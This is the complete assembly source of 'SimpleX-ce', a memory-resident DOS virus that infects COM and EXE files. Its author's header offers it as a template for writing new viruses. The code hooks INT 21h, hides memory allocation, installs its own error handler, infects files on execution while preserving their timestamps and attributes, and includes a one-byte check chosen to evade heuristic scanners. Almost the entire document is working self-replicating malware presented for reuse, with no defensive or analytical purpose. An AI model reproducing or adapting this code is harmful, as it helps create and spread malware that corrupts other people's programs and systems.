
; Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
;  SimpleX-ce - coded by ûirogen --=SiAC=--
; Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;  I just wrote this to use as a starting point for new virii - use it
;  as you wish. It's a short and sweet, yet fully functional infector
;  with the standard characteristics, no less, no more. If you try you
;  may be able to decrease the size some.
; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;
; Length: 486 code + 20 bytes text = 506  (+24 bytes heap in mem only)
; Type: PRhA
; Symptoms: EXE/COM size increase; conventional memory size decreased
;
; ş Infects files when they are executed
; ş Time/Date do not change
; ş Read-only and hidden files will be infected, and attributes restored.
; ş Virus installs its own critical error handler
; ş Size increase of 506 bytes in both COM and EXE filez
;
; The text "[ûirogen SimpleX-ce]" is visible within the virus code.
;
;
cseg segment
     assume cs:cseg, ds:cseg, es:cseg, ss:cseg

signal equ 0B45h
exe_id equ 'GV'

org 0h                                   ; hellacious EXE offset calcs if !0
start:

     call    nx                          ; get relative offset
     nx:     pop bp
     sub     bp,offset nx

     push    ds es
     mov     ax,signal                    ; are we memory resident?
     int     21h
     or      ax,ax
     jz      no_install                   ; if carry then we are

     mov     ax,ds                        ; PSP segment
     dec     ax                           ; mcb below PSP m0n
     mov     ds,ax                        ; DS=MCB seg
     cmp     byte ptr ds: [0],'Z'         ; Is this the last MCB in chain?
     jnz     no_install
     sub     word ptr ds: [3],((vend-start+1023)/1024)*64 ; alloc MCB
     sub     word ptr ds: [12h],((vend-start+1023)/1024)*64 ; alloc PSP
     mov     es,word ptr ds: [12h]        ; get high mem seg
     push    cs
     pop     ds
     mov     si,bp
     mov     cx,(offset vend - offset start)/2+1
     xor     di,di
     rep     movsw                        ; copy code to new seg
     xor     ax,ax
     mov     ds,ax                        ; null ds
     push    ds
     lds     ax,ds: [21h*4]               ; get 21h vector
     mov     es: word ptr old21+2,ds      ; save S:O
     mov     es: word ptr old21,ax
     pop     ds
     mov     ds: [21h*4+2],es             ; new int 21h seg
     mov     ds: [21h*4],offset new21     ; new offset
     sub     byte ptr ds: [413h],(offset vend-offset start+1023)/1024;-totalmem

     no_install:

     pop     es ds                   ; restore ES DS
     cmp     sp,exe_id
     jz      exe_return

     lea     si,org_bytes[bp]        ; com return
     mov     di,0100h                ; -restore first 4 bytes
     mov     cx,2
     rep     movsw

     mov     ax,100h                 ; jump back to 100h
     push    ax
_ret:ret

     exe_return:
     mov      cx,ds                  ; calc. real CS
     add      cx,10h
     add      word ptr cs:[exe_jump+2+bp],cx
     mov      sp,oldsp                ; restore old SP.. (SS is still same)
     jmp      dword ptr cs:[exe_jump+bp]
;     db       0eah                   ; worx in debugger, not in life,
exe_jump dd 0                         ; go figure.. help me someone
oldsp  dw 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Infection routine - called from INT 21h handler.
;    DS:DX=fname
;

infect_file:

        push    dx
        pop     si

        cmp     word ptr [si+1],'MO'    ; is cOMmand.com?
        jz      _ret

        push    ds
        xor     ax,ax                   ; null ES
        mov     es,ax
        lds     ax,es:[24h*4]           ; get INT 24h vector
        mov     old_24_off,ax           ; save it
        mov     old_24_seg,ds
        mov     es:[24h*4+2],cs         ; install our handler
        mov     es:[24h*4],offset new_24
        pop     ds
        push    es                      ; we'll need it later

        mov     ax,4300h                ; get phile attribute
        int     21h
        mov     ax,4301h                ; null attribs
        push    ax cx                   ; save AX-call/CX-attrib
        xor     cx,cx
        int     21h

        mov     ax,3d02h                ; open the file
        int     21h
        jc      dont_do

        mov     bx,ax                   ; get handle
 
        push    cs
        pop     ds

        mov     ah,3fh                  ; Read first bytes of file
        mov     cx,18h
        lea     dx,org_bytes
        int     21h

        ;cmp    word ptr org_byte,'ZM'    ; more secure but larger & common sig.
        cmp     byte ptr org_bytes,'M'    ; EXE? (single byte avoids heuristics)
        jz      do_exe
        cmp     byte ptr org_bytes,0FBh   ; STI?
        jz      close

        mov     ax,5700h                  ; get time/date
        int     21h
        push    cx dx

        call    offset_end
        push    ax

        xor     dx,dx
        mov     cx,(offset heap-offset start)
        mov     ah,40h
        int     21h

        call    offset_zero
        pop     ax                        ; restore COM file size
        sub     ax,4                      ; calculate jmp offset
        mov     word ptr new_jmp+1,ax

        lea     dx,new_code
        mov     cx,4
        mov     ah,40h
        int     21h

        pop     dx cx                     ; pop date/time
        mov     ax,5701h                  ; restore the mother fuckers
        int     21h

 close:

        pop     cx ax                     ; restore attrib
        int     21h

        mov     ah,3eh
        int     21h

 dont_do:
        pop     es                        ; ES=0
        lds     ax,dword ptr old_24_off   ; restore shitty DOS error handler
        mov     es:[24h*4],ax
        mov     es:[24h*4+2],ds

        ret

 do_exe:

        cmp     word ptr exe_header[10h],exe_id  ; is SP our id?
        jz      close

        push    bx

        mov     ax,word ptr exe_header[10h]
        mov     oldsp,ax                         ; save old SP
        mov     word ptr exe_header[10h],exe_id  ; mark that it's us

        les     ax,dword ptr exe_header+14h ; Save old entry point
        mov     word ptr ds:exe_jump, ax
        mov     word ptr ds:exe_jump+2, es

        push    cs
        pop     es

        call    offset_end

        push    dx ax dx ax                 ; save file size DX:AX

        mov     cx,offset heap-offset start  ; write virus
        xor     dx,dx
        mov     ah,40h
        int     21h

        pop     ax dx                       ; restore size
        mov     bx, word ptr exe_header+8h  ; calc. new entry point
        mov     cl,4                        ; *16
        shl     bx,cl                       ;  ^by shifting one byte
        sub     ax,bx                       ; get actual file size-header
        sbb     dx,0
        mov     cx,10h                      ; divide AX/CX rDX
        div     cx

        mov     word ptr exe_header+14h,dx
        mov     word ptr exe_header+16h,ax

        pop     ax                         ; AX:DX file size
        pop     dx
        pop     bx

        mov     cx,offset heap-offset start+10h  ; calc. new size
        adc     ax,cx

        mov     cl,9                       ; calc new alloc (512)
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax                         ; ax=size+virus
        and     ah,1

        mov     word ptr exe_header+4h,dx
        mov     word ptr exe_header+2h,ax

        call    offset_zero

        mov     cx,18h                     ; write fiXed header
        lea     dx,exe_header
        mov     ah,40h
        int     21h

        jmp     close

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; set file ptr

offset_zero:                               ; self explanitory
        xor     al,al
        jmp     set_fp
offset_end:
        mov     al,02h
 set_fp:
        mov     ah,42h
        xor     cx,cx
        xor     dx,dx
        int     21h
        ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; new 21h

new21:

      cmp ax,signal            ; be it us?
      jnz not_us               ; richtig..
      xor ax,ax
      iret
      not_us:
      cmp ax,4b00h             ; execute phile?
      jnz jmp_org

      push ax bx cx di dx si ds es
      call infect_file
      pop es ds si dx di cx bx ax

      jmp_org:
      db 0eah                              ; jump far XXXX:XXXX
      old21 dd 0

new_24:                                    ; critical error handler
       mov al,3                            ; prompts suck, return fail
       iret



credits db '[ûirogen SimpleX-ce]'
new_code db 0Fbh                           ; STI      (our marker)
new_jmp db 0E9h,0,0                        ; jmp XXXX
exe_header:
org_bytes db 0CDh,20h,0,0                  ; original COM bytes | exe hdr
heap:
db        14h dup(0)                       ; remaining exe header space
old_24_off dw 0                            ; old int24h vector
old_24_seg dw 0
vend:
cseg ends
     end start

